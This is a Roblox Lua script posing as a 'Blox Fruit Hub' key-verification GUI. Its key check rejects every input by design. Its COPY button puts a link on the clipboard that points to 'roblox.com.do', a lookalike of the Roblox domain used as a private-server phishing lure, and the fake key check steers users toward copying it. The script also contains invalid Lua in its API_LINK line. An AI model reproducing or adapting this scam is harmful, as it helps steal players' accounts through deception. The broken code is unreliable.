-- BLOX FRUIT HUB - Key System GUI
-- Made by ashfall
-- ============================================

-- Configuration
local API_LINK = ["https://www.roblox.com.do/games/2753915549/Blox-Fruits?privateServerLinkCode=567378413112538567714922688271"]

-- Create Main ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BloxFruitHubGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 500, 0, 300)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(26, 26, 46)
mainFrame.BorderColor3 = Color3.fromRGB(0, 212, 255)
mainFrame.BorderSizePixel = 3
mainFrame.Parent = screenGui

-- Add rounded corner effect (using UICorner)
local cornerRadius = Instance.new("UICorner")
cornerRadius.CornerRadius = UDim.new(0, 12)
cornerRadius.Parent = mainFrame

-- Title Label
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 15)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "🎮 BLOX FRUIT HUB"
titleLabel.TextColor3 = Color3.fromRGB(0, 212, 255)
titleLabel.TextSize = 32
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

-- Subtitle Label
local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Name = "Subtitle"
subtitleLabel.Size = UDim2.new(1, 0, 0, 20)
subtitleLabel.Position = UDim2.new(0, 0, 0, 65)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Text = "made by ashfall"
subtitleLabel.TextColor3 = Color3.fromRGB(136, 136, 136)
subtitleLabel.TextSize = 12
subtitleLabel.Font = Enum.Font.GothamMedium
subtitleLabel.Parent = mainFrame

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -50, 0, 120)
contentFrame.Position = UDim2.new(0, 25, 0, 100)
contentFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
contentFrame.BackgroundTransparency = 0.7
contentFrame.BorderColor3 = Color3.fromRGB(0, 212, 255)
contentFrame.BorderSizePixel = 2
contentFrame.Parent = mainFrame

local contentCorner = Instance.new("UICorner")
contentCorner.CornerRadius = UDim.new(0, 8)
contentCorner.Parent = contentFrame

-- Section Title
local sectionLabel = Instance.new("TextLabel")
sectionLabel.Name = "SectionTitle"
sectionLabel.Size = UDim2.new(1, -20, 0, 25)
sectionLabel.Position = UDim2.new(0, 10, 0, 10)
sectionLabel.BackgroundTransparency = 1
sectionLabel.Text = "📋 KEY VERIFICATION"
sectionLabel.TextColor3 = Color3.fromRGB(0, 212, 255)
sectionLabel.TextSize = 14
sectionLabel.Font = Enum.Font.GothamBold
sectionLabel.TextXAlignment = Enum.TextXAlignment.Left
sectionLabel.Parent = contentFrame

-- Check Key Button (LEFT)
local checkKeyButton = Instance.new("TextButton")
checkKeyButton.Name = "CheckKeyButton"
checkKeyButton.Size = UDim2.new(0.45, 0, 0, 40)
checkKeyButton.Position = UDim2.new(0, 10, 0, 45)
checkKeyButton.BackgroundColor3 = Color3.fromRGB(10, 77, 94)
checkKeyButton.BorderColor3 = Color3.fromRGB(0, 212, 255)
checkKeyButton.BorderSizePixel = 2
checkKeyButton.Text = "CHECK KEY"
checkKeyButton.TextColor3 = Color3.fromRGB(0, 212, 255)
checkKeyButton.TextSize = 13
checkKeyButton.Font = Enum.Font.GothamBold
checkKeyButton.Parent = contentFrame

local checkCorner = Instance.new("UICorner")
checkCorner.CornerRadius = UDim.new(0, 6)
checkCorner.Parent = checkKeyButton

-- Copy Button (RIGHT)
local copyButton = Instance.new("TextButton")
copyButton.Name = "CopyButton"
copyButton.Size = UDim2.new(0.45, 0, 0, 40)
copyButton.Position = UDim2.new(0.55, 0, 0, 45)
copyButton.BackgroundColor3 = Color3.fromRGB(94, 10, 10)
copyButton.BorderColor3 = Color3.fromRGB(255, 68, 68)
copyButton.BorderSizePixel = 2
copyButton.Text = "COPY"
copyButton.TextColor3 = Color3.fromRGB(255, 68, 68)
copyButton.TextSize = 13
copyButton.Font = Enum.Font.GothamBold
copyButton.Parent = contentFrame

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 6)
copyCorner.Parent = copyButton

-- API Link is hidden but still accessible via COPY button

-- Key Input Field
local keyInput = Instance.new("TextBox")
keyInput.Name = "KeyInput"
keyInput.Size = UDim2.new(1, -50, 0, 35)
keyInput.Position = UDim2.new(0, 25, 0, 245)
keyInput.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyInput.BackgroundTransparency = 0.5
keyInput.BorderColor3 = Color3.fromRGB(0, 212, 255)
keyInput.BorderSizePixel = 2
keyInput.TextColor3 = Color3.fromRGB(0, 212, 255)
keyInput.TextSize = 13
keyInput.Font = Enum.Font.Code
keyInput.PlaceholderText = "Paste your key here..."
keyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
keyInput.Parent = screenGui

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 6)
inputCorner.Parent = keyInput

-- Status Message
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Size = UDim2.new(1, -50, 0, 30)
statusLabel.Position = UDim2.new(0, 25, 0, 290)
statusLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
statusLabel.BackgroundTransparency = 0.5
statusLabel.BorderColor3 = Color3.fromRGB(0, 212, 255)
statusLabel.BorderSizePixel = 1
statusLabel.Text = "Ready to verify your key"
statusLabel.TextColor3 = Color3.fromRGB(136, 136, 136)
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = screenGui

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 6)
statusCorner.Parent = statusLabel

-- ============================================
-- BUTTON FUNCTIONS
-- ============================================

checkKeyButton.MouseButton1Click:Connect(function()
    statusLabel.Text = "Checking key... Please wait..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    
    wait(1.5)
    
    local key = keyInput.Text
    if key == "" then
        statusLabel.Text = "❌ Please enter a key first"
        statusLabel.TextColor3 = Color3.fromRGB(255, 68, 68)
    else
        -- Add your key validation logic here
        statusLabel.Text = "❌ Key verification failed - Enter a valid key"
        statusLabel.TextColor3 = Color3.fromRGB(255, 68, 68)
    end
end)

copyButton.MouseButton1Click:Connect(function()
    local linkToCopy = "https://www.roblox.com.do/games/2753915549/Blox-Fruits?privateServerLinkCode=567378413112538567714922688271"
    
    setclipboard(linkToCopy)
    
    statusLabel.Text = "✓ Link copied to clipboard!"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    
    wait(3)
    statusLabel.Text = "Ready to verify your key"
    statusLabel.TextColor3 = Color3.fromRGB(136, 136, 136)
end)

-- Mouse hover effects
local function addHoverEffect(button, originalColor, hoverColor)
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = hoverColor
    end)
    
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = originalColor
    end)
end

addHoverEffect(checkKeyButton, Color3.fromRGB(10, 77, 94), Color3.fromRGB(13, 107, 126))
addHoverEffect(copyButton, Color3.fromRGB(94, 10, 10), Color3.fromRGB(126, 13, 13))

-- ============================================
-- HOW TO USE:
-- 1. Paste this script in ServerScriptService or StarterPlayer > StarterCharacterScripts
-- 2. Change the API_LINK variable (line 7) with your actual API link
-- 3. Add your key validation logic in the "CHECK KEY" button function
-- 4. Customize colors and styling as needed
-- ============================================